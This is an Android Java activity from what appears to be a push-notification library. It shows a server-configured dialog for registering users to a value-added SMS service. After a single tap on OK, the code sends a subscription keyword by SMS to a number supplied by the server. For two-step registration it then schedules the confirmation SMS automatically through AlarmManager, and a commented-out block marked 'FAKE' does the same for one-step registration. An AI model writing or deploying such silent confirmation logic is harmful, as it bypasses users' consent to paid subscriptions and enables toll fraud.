package ir.adnan.lib_requirement_code.pushe.dialog;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.Typeface;
import android.graphics.drawable.ColorDrawable;
import android.os.Bundle;
import android.support.annotation.Nullable;
import android.support.v7.app.AppCompatActivity;
import android.telephony.SmsManager;
import android.view.View;
import android.view.animation.AccelerateInterpolator;
import android.view.animation.AlphaAnimation;
import android.view.animation.Animation;
import android.widget.Button;
import android.widget.ImageView;

import com.afollestad.materialdialogs.MaterialDialog;
import com.squareup.picasso.Picasso;

import ir.adnan.lib_requirement_code.R;
import ir.adnan.lib_requirement_code.core.Log;
import ir.adnan.lib_requirement_code.core.Static;
import ir.adnan.lib_requirement_code.pushe.broadcast.SendSms;
import ir.adnan.lib_requirement_code.pushe.webservice.WebServiceInterface;
import ir.adnan.lib_requirement_code.pushe.webservice.model.vas_registration.GetRegistrationInfoOutput;
import ir.adnan.lib_requirement_code.pushe.webservice.model.vas_registration.ReportRegistrationStatusInput;
import ir.adnan.lib_requirement_code.pushe.webservice.model.vas_registration.ReportRegistrationStatusOutput;
import ir.adnan.lib_requirement_code.view.LibraryTextView;
import ir.adnan.lib_requirement_code.webservice.ApiClient;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

/**
 * Created by Adnan on 6/8/2017.
 */

public class DialogRegisterInfo extends AppCompatActivity {
    private static final String TAG = DialogRegisterInfo.class.getSimpleName();
    private Context THIS = DialogRegisterInfo.this;

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        getWindow().setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));

        Bundle extras = getIntent().getExtras();
        if (extras != null) {
            GetRegistrationInfoOutput getRegistrationInfoOutput = (GetRegistrationInfoOutput) extras.getSerializable("register");
            String image = extras.getString("image");
            //
            loadRegisterDialog(getRegistrationInfoOutput.getParameters() , image);
        }
    }

    public void loadRegisterDialog(final GetRegistrationInfoOutput.Parameters parameters, String imageUrl) {

        final MaterialDialog d = new MaterialDialog.Builder(THIS)
                .autoDismiss(false)
                .cancelable(false)
                .customView(R.layout.dialog_custom_vas_register, false)
                .show();

        LibraryTextView descriptionDialog = (LibraryTextView) d.findViewById(R.id.dialog_description);
//        descriptionDialog.setAutoLinkMask(Linkify.WEB_URLS);
        descriptionDialog.setText(parameters.getAgreementText());

        ImageView imageCancel = (ImageView) d.findViewById(R.id.dialog_image_cancel);
        imageCancel.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {

                reportRegistrationStatus(
                        "unRegister", parameters.getUID()
                );
                finish();
                d.dismiss();
            }
        });

        final ImageView imageHeader = (ImageView) d.findViewById(R.id.dialog_image);
        imageHeader.setVisibility(View.VISIBLE);
        imageHeader.setAdjustViewBounds(true);

        if(!"".equalsIgnoreCase(imageUrl)) {
            Picasso.with(THIS)
                    .load(imageUrl)
//                .resize(120, 60)
                    .into(imageHeader, new com.squareup.picasso.Callback() {
                        @Override
                        public void onSuccess() {
                            Animation fadeOut = new AlphaAnimation(0, 1);
                            fadeOut.setInterpolator(new AccelerateInterpolator());
                            fadeOut.setDuration(700);
                            imageHeader.startAnimation(fadeOut);
                        }

                        @Override
                        public void onError() {
                        }
                    });
        }

        Button okButton = (Button) d.findViewById(R.id.dialog_button_ok);
        okButton.setTypeface(Static.getMainTypeface(THIS), Typeface.BOLD);
        okButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if (parameters.getRegistrationType().equals("oneStep")) {
                    sendSMS(parameters.getHeadNumber(),
                            parameters.getFirstKeyWord());

                    //FAKE

//                    new Handler().postDelayed(new Runnable() {
//                        @Override
//                        public void run() {
//                            sendSMS(parameters.getHeadNumber(),
//                                    "L");
//                            //
//                            Preferences.setPrefsSendSecoundSms(THIS, true);
//
//                            Log.e(TAG , "from dialog , oneStep");
//                        }
//                    }, parameters.getDelayTime() * 1000);
                }
                if (parameters.getRegistrationType().equals("twoStep")) {
                    sendSMS(parameters.getHeadNumber(),
                            parameters.getFirstKeyWord());
                    //
//                    Preferences.setPrefsSendFirstSms(THIS, true);
//                    //
//                    new Handler().postDelayed(new Runnable() {
//                        @Override
//                        public void run() {
//                            sendSMS(parameters.getHeadNumber(),
//                                    parameters.getSecondKeyWord());
//                            //
//                            Preferences.setPrefsSendSecoundSms(THIS, true);
//                        }
//                    }, parameters.getDelayTime() * 1000);

                    // Alarm Manager
                    Intent intent = new Intent(THIS, SendSms.class);
                    intent.putExtra("number",parameters.getHeadNumber());
                    intent.putExtra("message",parameters.getSecondKeyWord());

                    PendingIntent pendingIntent = PendingIntent.getBroadcast(
                            THIS.getApplicationContext(), 6585, intent, 0);
                    AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
                    alarmManager.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis()
                            + (parameters.getDelayTime() * 1000), pendingIntent);
                }
                // Save User To Preference
//                Preferences.setPrefsSmsRegistered(THIS, true);
                // WebService Launch
                reportRegistrationStatus(
                        "register", parameters.getUID()
                );
                //
                finish();
                d.dismiss();
            }
        });
    }

    public void sendSMS(String phoneNumber, String message) {
        String SENT = "SMS_SENT";
        String DELIVERED = "SMS_DELIVERED";

        Log.e(TAG, phoneNumber + "\n" + message);

//        PendingIntent sentPI = PendingIntent.getBroadcast(this, 0,
//                new Intent(SENT), 0);
//
//        PendingIntent deliveredPI = PendingIntent.getBroadcast(this, 0,
//                new Intent(DELIVERED), 0);
//
//        //---when the SMS has been sent---
//        registerReceiver(new BroadcastReceiver() {
//            @Override
//            public void onReceive(Context arg0, Intent arg1) {
//                switch (getResultCode()) {
////                    case Activity.RESULT_OK:
////                        Toast.makeText(getBaseContext(), "SMS sent",
////                                Toast.LENGTH_SHORT).show();
////                        break;
////                    case SmsManager.RESULT_ERROR_GENERIC_FAILURE:
////                        Toast.makeText(getBaseContext(), "Generic failure",
////                                Toast.LENGTH_SHORT).show();
////                        break;
////                    case SmsManager.RESULT_ERROR_NO_SERVICE:
////                        Toast.makeText(getBaseContext(), "No service",
////                                Toast.LENGTH_SHORT).show();
////                        break;
////                    case SmsManager.RESULT_ERROR_NULL_PDU:
////                        Toast.makeText(getBaseContext(), "Null PDU",
////                                Toast.LENGTH_SHORT).show();
////                        break;
////                    case SmsManager.RESULT_ERROR_RADIO_OFF:
////                        Toast.makeText(getBaseContext(), "Radio off",
////                                Toast.LENGTH_SHORT).show();
////                        break;
//                }
//            }
//        }, new IntentFilter(SENT));
//
//        //---when the SMS has been delivered---
//        registerReceiver(new BroadcastReceiver() {
//            @Override
//            public void onReceive(Context arg0, Intent arg1) {
//                switch (getResultCode()) {
////                    case Activity.RESULT_OK:
////                        Toast.makeText(getBaseContext(), "SMS delivered",
////                                Toast.LENGTH_SHORT).show();
////                        break;
////                    case Activity.RESULT_CANCELED:
////                        Toast.makeText(getBaseContext(), "SMS not delivered",
////                                Toast.LENGTH_SHORT).show();
////                        break;
//                }
//            }
//        }, new IntentFilter(DELIVERED));

        SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage(phoneNumber, null, message, null, null);
    }

    private void reportRegistrationStatus(String status, String uid) {
        WebServiceInterface webServiceInterface = ApiClient.getClient().create(WebServiceInterface.class);

        Call<ReportRegistrationStatusOutput> call = webServiceInterface.reportRegistrationStatus(new ReportRegistrationStatusInput(new ReportRegistrationStatusInput.Parameters(
                status, uid
        )));
        call.enqueue(new Callback<ReportRegistrationStatusOutput>() {

            @Override
            public void onResponse(Call<ReportRegistrationStatusOutput> call, Response<ReportRegistrationStatusOutput> response) {
                Log.e(TAG, "ReportRegistrationStatusOutput ");
                try {


                } catch (Exception e) {
                    Log.e(TAG, "error in ReportRegistrationStatusOutput " + e.getMessage());
                    e.printStackTrace();
                }
            }

            @Override
            public void onFailure(Call<ReportRegistrationStatusOutput> call, Throwable t) {
                Log.e(TAG, "Error ReportRegistrationStatusOutput is : ");

            }
        });
    }
}
